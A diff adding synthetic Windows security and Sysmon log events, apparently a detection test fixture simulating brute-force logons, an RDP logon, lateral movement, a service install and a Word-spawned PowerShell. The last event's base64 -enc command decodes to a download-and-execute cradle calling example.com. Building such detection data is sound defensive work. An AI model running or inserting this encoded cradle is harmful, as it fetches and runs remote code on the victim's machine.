@@ -1,0 +1,17 @@
+{"Timestamp":"2026-03-03T10:00:01Z","DeviceName":"workstation-1","Channel":"Security","EventID":4625,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"3"}
+{"Timestamp":"2026-03-03T10:00:05Z","DeviceName":"workstation-1","Channel":"Security","EventID":4625,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"3"}
+{"Timestamp":"2026-03-03T10:00:10Z","DeviceName":"workstation-1","Channel":"Security","EventID":4625,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"3"}
+{"Timestamp":"2026-03-03T10:00:15Z","DeviceName":"workstation-1","Channel":"Security","EventID":4625,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"3"}
+{"Timestamp":"2026-03-03T10:00:20Z","DeviceName":"workstation-1","Channel":"Security","EventID":4625,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"3"}
+{"Timestamp":"2026-03-03T10:00:25Z","DeviceName":"workstation-1","Channel":"Security","EventID":4625,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"3"}
+{"Timestamp":"2026-03-03T10:00:30Z","DeviceName":"workstation-1","Channel":"Security","EventID":4625,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"3"}
+{"Timestamp":"2026-03-03T10:00:35Z","DeviceName":"workstation-1","Channel":"Security","EventID":4625,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"3"}
+{"Timestamp":"2026-03-03T10:00:40Z","DeviceName":"workstation-1","Channel":"Security","EventID":4625,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"3"}
+{"Timestamp":"2026-03-03T10:00:45Z","DeviceName":"workstation-1","Channel":"Security","EventID":4625,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"3"}
+
+{"Timestamp":"2026-03-03T10:02:00Z","DeviceName":"workstation-1","Channel":"Security","EventID":4624,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"10"}
+{"Timestamp":"2026-03-03T10:07:00Z","DeviceName":"server-1","Channel":"Security","EventID":4624,"SubjectUserName":"employee","IpAddress":"10.0.0.55","LogonType":"3"}
+
+{"Timestamp":"2026-03-03T10:08:00Z","DeviceName":"server-1","Channel":"System","EventID":7045,"SubjectUserName":"employee"}
+
+{"Timestamp":"2026-03-03T10:09:00Z","DeviceName":"workstation-1","Channel":"Sysmon","EventID":1,"User":"employee","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0AJwApAA=="}
